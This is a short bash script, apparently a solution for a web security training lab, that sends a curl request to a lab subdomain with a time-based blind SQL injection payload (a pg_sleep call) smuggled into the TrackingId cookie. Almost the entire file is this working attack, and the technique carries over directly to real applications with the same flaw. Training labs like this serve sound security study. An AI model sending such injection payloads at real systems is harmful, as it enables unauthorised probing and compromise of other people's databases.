#!/bin/bash
if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain";
	exit 1;
fi
url="https://$1.web-security-academy.net";

curl -b "TrackingId=' && pg_sleep(10) --" "$url"